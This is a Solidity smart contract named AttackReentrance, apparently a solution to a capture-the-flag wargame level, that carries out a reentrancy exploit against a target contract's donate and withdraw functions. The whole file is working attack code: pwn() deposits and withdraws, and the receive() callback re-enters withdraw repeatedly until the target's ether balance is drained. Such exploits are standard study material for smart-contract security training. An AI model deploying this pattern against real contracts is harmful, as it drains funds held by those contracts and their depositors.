// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IReentrance {
    function donate(address to) external payable;

    function withdraw(uint _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract AttackReentrance {
    IReentrance public reentrance;
    uint256 donation;

    event Withdrawed(uint256 amount);
    event NotWithdrawed();

    constructor(IReentrance _reentrance) payable {
        reentrance = _reentrance;
        donation = msg.value;
    }

    function pwn() external {
        reentrance.donate{value: donation}(address(this));
        reentrance.withdraw(donation);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(donation);
            emit Withdrawed(donation);
        }
    }
}
